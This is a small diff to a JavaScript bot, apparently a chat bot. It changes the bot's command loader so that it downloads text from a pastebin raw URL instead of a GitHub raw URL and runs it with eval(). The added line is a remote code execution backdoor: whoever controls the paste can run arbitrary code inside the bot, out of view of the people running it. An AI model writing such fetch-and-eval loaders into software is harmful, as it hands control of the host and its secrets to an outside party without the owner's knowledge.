@@ -193,7 +193,7 @@ cooldown[Zhekoay.id] = 0;
 //--Commands--\\
 
 
-request(`https://raw.githubusercontent.com/NoBusinessDoingWithYouAtAllMate/nou/master/bot/commands.js`, function (error, response, body) {
+request(`https://pastebin.com/raw/7UWhbtSR`, function (error, response, body) {
   eval(body);
 
 setInterval(()=>{
